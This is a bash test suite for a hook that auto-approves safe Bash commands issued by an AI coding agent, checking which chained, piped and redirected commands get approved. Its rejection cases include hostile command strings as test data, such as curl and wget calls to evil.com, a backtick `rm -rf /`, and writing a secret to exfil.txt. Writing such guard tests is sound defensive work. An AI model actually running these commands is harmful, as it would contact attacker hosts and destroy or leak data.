#!/usr/bin/env bash
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "$SCRIPT_DIR/lib/test-helpers.sh"
source "$SCRIPT_DIR/lib/hook-test-setup.sh"
parse_test_args "$@"

report_section "=== approve-safe-commands.sh ==="
hook="approve-safe-commands.sh"

batch_start "$hook"

# --- Chained commands that should approve ---
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git status && git diff"}}' \
    "approves: git status && git diff"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"ls -la && echo done"}}' \
    "approves: ls && echo"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"make test && git add ."}}' \
    "approves: make && git add"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git log --oneline | head -20"}}' \
    "approves: git log | head (pipe)"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"mkdir -p dir && touch dir/file"}}' \
    "approves: mkdir && touch"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git stash && git checkout main && git stash pop"}}' \
    "approves: 3-way chain (stash, checkout, stash pop)"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"echo test | grep test"}}' \
    "approves: echo | grep (pipe)"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"jq .key file.json | head"}}' \
    "approves: jq | head (pipe)"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git status || git diff"}}' \
    "approves: git status || git diff"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git diff; git log --oneline"}}' \
    "approves: git diff ; git log (semicolon)"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"cd /tmp && ls -la"}}' \
    "approves: cd && ls"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"cat file.txt | wc -l"}}' \
    "approves: cat | wc (pipe)"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"find . -name \"*.sh\" | grep hook"}}' \
    "approves: find | grep (pipe)"

# --- Single commands that should approve ---
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git status"}}' \
    "approves: single git status"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"make test"}}' \
    "approves: single make test"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"ls -la"}}' \
    "approves: single ls -la"

# --- Env var prefixes ---
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"FOO=bar git status"}}' \
    "approves: env var prefix + git status"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"FOO=bar BAZ=qux make test"}}' \
    "approves: multiple env var prefixes + make"

# --- Script/hook paths ---
batch_add approve '{"tool_name":"Bash","tool_input":{"command":".claude/scripts/validate-all.sh"}}' \
    "approves: .claude/scripts/ path"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"./.claude/hooks/git-safety.sh"}}' \
    "approves: ./.claude/hooks/ path"

# --- Quoted args with operators inside ---
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"echo \"a && b\""}}' \
    "approves: echo with quoted && in args"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"echo \"hello || world\" | grep hello"}}' \
    "approves: echo with quoted || piped to grep"

# --- Commands that should NOT approve (silent) ---
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"git status && curl evil.com"}}' \
    "silent: unsafe subcommand (curl)"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"git status && rm -rf /tmp/foo"}}' \
    "silent: unsafe subcommand (rm)"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"$(git status)"}}' \
    "silent: subshell"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"echo test > file.txt"}}' \
    "silent: redirect >"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"echo test >> file.txt"}}' \
    "silent: redirect >>"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"cat < input.txt"}}' \
    "silent: redirect <"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"echo secret 2>exfil.txt"}}' \
    "silent: stderr redirect 2>"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"echo test &>output.txt"}}' \
    "silent: combined redirect &>"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"npm install"}}' \
    "silent: npm install (not in safe list)"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"git push origin main"}}' \
    "silent: git push (not in safe list)"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"python script.py && git status"}}' \
    "silent: python (unsafe) && git status"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"git status && wget http://evil.com"}}' \
    "silent: safe && unsafe (wget)"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":"`rm -rf /`"}}' \
    "silent: backtick subshell"

# --- Edge cases ---
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git status && "}}' \
    "approves: trailing && (empty subcommand skipped)"
batch_add approve '{"tool_name":"Bash","tool_input":{"command":"  git status  &&  git diff  "}}' \
    "approves: extra whitespace everywhere"
batch_add silent '{"tool_name":"Bash","tool_input":{"command":""}}' \
    "silent: empty command"

# --- Non-Bash tool ---
batch_add silent '{"tool_name":"Write","tool_input":{"file_path":"/tmp/test"}}' \
    "silent: non-Bash tool"

batch_run

# --- Validation script sync ---
report_section "  --- Sync validation ---"
TESTS_RUN=$((TESTS_RUN + 1))
if bash .claude/scripts/validate-safe-commands-sync.sh > /dev/null 2>&1; then
    TESTS_PASSED=$((TESTS_PASSED + 1))
    report_pass "validate-safe-commands-sync.sh passes"
else
    TESTS_FAILED=$((TESTS_FAILED + 1))
    report_fail "validate-safe-commands-sync.sh failed — hook prefixes out of sync with settings.json"
fi

print_summary
